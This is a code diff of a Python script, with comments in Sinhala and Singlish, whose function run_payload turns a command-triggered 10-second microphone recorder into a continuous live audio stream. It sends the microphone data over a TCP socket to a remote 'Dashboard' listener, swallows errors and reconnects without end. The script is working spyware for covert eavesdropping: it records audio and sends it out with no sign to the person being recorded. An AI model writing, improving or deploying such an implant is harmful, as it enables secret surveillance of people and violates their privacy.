@@ -3,30 +3,34 @@ import sounddevice as sd
 import time
 
 SERVER_IP = '127.0.0.1' 
-PORT = 65432
+PORT = 50005  # Oya dan use karana port eka danna
+
+def callback(indata, frames, time, status):
+    """Me function eka microphone eken ena data Dashboard ekata yawai"""
+    if status:
+        print(status)
+    try:
+        global client_socket
+        client_socket.sendall(indata.tobytes())
+    except:
+        pass
 
 def run_payload():
+    global client_socket
     while True:
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(10)
-                s.connect((SERVER_IP, PORT))
-                
-                # Receiver එකෙන් කරන නියෝගය ලබාගැනීම
-                command = s.recv(1024).decode()
-                
-                if command == "START":
-                    # තත්පර 10ක් record කිරීම
-                    fs = 44100
-                    duration = 10
-                    rec = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
-                    sd.wait()
-                    s.sendall(rec.tobytes())
-                else:
-                    # නියෝගයක් නැත්නම් තත්පර 5ක් නිහඬව සිටීම
-                    time.sleep(5)
-        except:
-            time.sleep(10) # Server එක connect වීමට නොහැකි නම්
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.settimeout(10)
+            client_socket.connect((SERVER_IP, PORT))
+            
+            # Live streaming start karanawa
+            with sd.InputStream(samplerate=44100, channels=1, dtype='int16', callback=callback):
+                while True:
+                    time.sleep(1) # Digatama stream eka thiyaganna
+                    
+        except Exception as e:
+            print(f"Connection lost, retrying... {e}")
+            time.sleep(5)
 
 if __name__ == "__main__":
     run_payload()
